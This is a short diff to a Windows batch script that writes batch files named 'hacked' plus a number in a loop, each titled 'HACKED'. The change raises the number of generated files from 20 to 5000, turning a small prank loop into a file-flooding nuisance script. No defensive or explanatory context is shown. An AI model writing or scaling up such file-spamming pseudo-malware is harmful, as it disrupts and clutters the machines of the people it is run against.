@@ -48,7 +48,7 @@ goto loop
 
 :loop
 cls
-if "%number%" == "20" goto endcheck
+if "%number%" == "5000" goto endcheck
 color 0C
 echo @echo off>>hacked%number%.bat
 echo title HACKED>>hacked%number%.bat
